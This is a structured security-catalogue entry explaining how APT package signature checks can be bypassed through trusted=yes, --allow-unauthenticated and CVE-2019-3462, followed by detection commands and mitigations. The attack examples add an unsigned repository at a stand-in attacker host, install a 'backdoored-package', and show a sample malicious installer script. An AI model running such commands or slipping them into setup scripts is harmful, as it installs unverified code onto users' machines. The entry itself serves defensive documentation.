---
name: "APT GPG Signature Verification Bypass"
packageManager: "apt"
slug: "apt-gpg-bypass"
category: "Signature Bypass"
severity: "high"
platform:
  - "Linux"
description: "APT authenticates signed Release metadata and verifies the hashes that connect Release files, Packages indexes, and downloaded packages. Administrators can explicitly weaken those checks with options such as trusted=yes or --allow-unauthenticated. Separately, CVE-2019-3462 allowed a network attacker to inject fields into APT's HTTP worker protocol and falsify the reported hashes for a malicious package; it was not a signature-downgrade attack."
descriptionCitations: [1, 2, 3, 4, 5, 6]
prerequisites:
  - "Root or sudo access to modify APT source configuration files (for trusted=yes)"
  - "Or the ability to influence apt-get command-line arguments (for --allow-unauthenticated)"
  - "For CVE-2019-3462: the installed distribution package must lack its vendor's security fix"
prerequisitesCitations: [1, 2, 3, 4, 5, 6]
attackScenarios:
  - title: "Bypass via trusted=yes Repository Option"
    description: "The trusted=yes option in an APT sources.list entry tells APT to consider that source trusted even when authentication checks fail. It disables parts of apt-secure and can allow installation from an unsigned or otherwise unauthenticated repository, so Debian documents it only for a local and trusted context, if it is used at all."
    citations: [1, 2, 3, 4, 5, 6]
    commands:
      - label: "Add an unsigned repository with GPG bypass"
        code: |
          # [trusted=yes] treats this source as trusted even if authentication fails
          echo "deb [trusted=yes] http://packages.attacker.com/debian stable main" | sudo tee /etc/apt/sources.list.d/attacker.list
          sudo apt-get update
        language: "bash"
      - label: "Install a package from the source treated as trusted"
        code: |
          # APT will not warn about missing signatures for this source
          sudo apt-get install -y backdoored-package
        language: "bash"
  - title: "Bypass via --allow-unauthenticated Flag"
    description: "The --allow-unauthenticated flag can be passed to apt-get to suppress signature verification errors for individual install operations. Attackers may embed this flag in malicious install scripts or automation playbooks to silently install unsigned packages."
    citations: [1, 2, 3, 4, 5, 6]
    commands:
      - label: "Force installation of an unsigned package"
        code: |
          # Bypasses GPG verification for this specific install
          sudo apt-get install --allow-unauthenticated -y suspicious-package
        language: "bash"
      - label: "Malicious install script that hides the flag"
        code: |
          #!/bin/bash
          # install.sh - "Easy installer" distributed by attacker
          echo "Installing security tools..."
          sudo add-apt-repository -y ppa:attacker/tools
          sudo apt-get update
          sudo apt-get install --allow-unauthenticated -y security-suite
        language: "bash"
  - title: "APT HTTP Transport Redirect Exploitation (CVE-2019-3462)"
    description: "CVE-2019-3462 insufficiently sanitized an HTTP redirect Location field before writing it into APT's worker-protocol response. A network attacker could inject a forged 201 URI Done message, point APT at attacker-controlled package bytes, and report the hash APT expected from signed metadata. Fixed package versions differ by distribution and release, so a universal version comparison is unsafe."
    citations: [1, 2, 3, 4, 5, 6]
    commands:
      - label: "Conceptual exploit flow for CVE-2019-3462"
        code: |
          # The historical vulnerability used a crafted HTTP Location header:
          # 1. APT's HTTP worker URL-decoded the redirect value.
          # 2. Embedded newlines injected a forged 201 URI Done response.
          # 3. The forged response supplied APT's expected hash for malicious bytes.
          # 4. The parent process trusted the worker's forged hash report.
          #
          # Identify the installed distribution package, then consult its tracker:
          apt-cache policy apt
        language: "bash"
detection:
  - title: "Scan for trusted=yes in APT source configurations"
    description: "Search all APT source files for the trusted=yes option, which overrides APT's trust decision and disables parts of apt-secure. Any occurrence in production should be investigated and removed unless there is a documented exception for a local, trusted repository."
    citations: [1, 2, 3, 4, 5, 6]
    commands:
      - code: |
          # Find all sources using trusted=yes
          grep -rn "trusted=yes" /etc/apt/sources.list /etc/apt/sources.list.d/ 2>/dev/null
          # Also check for the allow-insecure option
          grep -rn "allow-insecure=yes" /etc/apt/sources.list /etc/apt/sources.list.d/ 2>/dev/null
        language: "bash"
  - title: "Monitor for --allow-unauthenticated usage"
    description: "Audit process execution logs and shell history for apt-get invocations that include the --allow-unauthenticated flag. This flag should never appear in production automation."
    citations: [1, 2, 3, 4, 5, 6]
    commands:
      - code: |
          # Search shell history files for the flag
          grep -r "allow-unauthenticated" /home/*/.bash_history /root/.bash_history 2>/dev/null
          # Audit via syslog or auditd
          ausearch -c apt-get 2>/dev/null | grep "allow-unauthenticated"
          # Check APT configuration for globally disabled verification
          apt-config dump | grep -i "AllowUnauthenticated"
        language: "bash"
  - title: "Verify APT version is patched against known CVEs"
    description: "Compare the installed distribution package with the fixed version in the Debian, Ubuntu, or other vendor security tracker. Distribution backports make upstream-only version comparisons unreliable."
    citations: [1, 2, 3, 4, 5, 6]
    commands:
      - code: |
          # Check APT version
          apt --version
          # Verify changelog for security patches
          zgrep -i "CVE-2019-3462" /usr/share/doc/apt/changelog.Debian.gz 2>/dev/null
        language: "bash"
mitigation:
  - "Never use trusted=yes for remote repositories; restrict its use to local or air-gapped development repos only"
  - "Prohibit the use of --allow-unauthenticated in all automation scripts, Ansible playbooks, and CI/CD pipelines"
  - "Set APT::Get::AllowUnauthenticated to false explicitly in /etc/apt/apt.conf.d/ to enforce GPG verification system-wide"
  - "Install the vendor security update for CVE-2019-3462 and verify the fixed package version in the distribution tracker"
  - "Implement auditd rules to alert on apt-get invocations containing bypass flags"
  - "Use Acquire::AllowInsecureRepositories and Acquire::AllowDowngradeToInsecureRepositories set to false in APT configuration"
mitigationCitations: [1, 2, 3, 4, 5, 6]
references:
  - title: "Ubuntu Security Notice USN-3863-1"
    url: "https://ubuntu.com/security/notices/USN-3863-1"
  - title: "Debian Wiki - SecureApt"
    url: "https://wiki.debian.org/SecureApt"
  - title: "apt-secure(8) Manual Page"
    url: "https://manpages.debian.org/bookworm/apt/apt-secure.8.en.html"
  - title: "APT Configuration - sources.list(5)"
    url: "https://manpages.debian.org/bookworm/apt/sources.list.5.en.html"
  - title: "CVE-2019-3462 Discoverer Analysis"
    url: "https://justi.cz/security/2019/01/22/apt-rce.html"
  - title: "Debian Security Tracker - CVE-2019-3462"
    url: "https://security-tracker.debian.org/tracker/CVE-2019-3462"
created: 2026-04-02
updated: 2026-10-14
---
